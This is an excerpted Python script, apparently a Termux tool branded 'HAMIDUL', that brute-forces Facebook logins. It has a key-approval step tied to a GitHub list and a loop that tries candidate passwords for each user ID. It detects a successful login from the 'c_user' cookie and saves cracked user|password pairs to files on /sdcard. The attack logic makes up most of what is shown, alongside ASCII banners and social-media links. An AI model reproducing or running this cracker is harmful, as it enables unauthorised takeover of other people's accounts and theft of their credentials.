...
def main_apv():
    ...
    try:
        ...
        print ("     Copy Key And Sent Me Telegram Approvel Your Key")

        print ("[$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]")

        time.sleep(3.5)

        tks = 'Dear%20Hamidul,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://www.facebook.com/profile.php?id=100074299117081?text=' + tks)

        

    r1=requests.get("https://raw.githubusercontent.com/AfghanHack001/Muslim/main/public.txt'").text
    ...
    if key1 in r1:
        ...
        tks = 'Dear%20HAMIDUl,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1
...
▒█░▒█ ▒█░▒█ ▒█░░▒█ ▄█▄ ▒█▄▄▀ ░▀▄▄▀ ▒█▄▄█
 ...
 [$]*****************************************************[$]
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ TOOL NAME : { HAMIDUL }   ║
   \x1b[1;92m║ AUTHOR    : HAMIDUL      ║
   \x1b[1;92m║ GITHUB    : git.me/MDHAM1IDUL ║
   \x1b[1;92m║ FACEBOOK  : ...............   ║
   \x1b[1;92m║ Group     : HAMIDUL ║
...
os.system('espeak -a 300 " Welcome,   to,  HAMIDUL , Tools, update, method,7.9"')
def hasil(OK,cp):
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[HAMIDUL]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [HAMIDUL-OK 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/HAMIDUL_CP.txt' , 'a').write('%s\n' % wrt)
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/HAMIDUL")
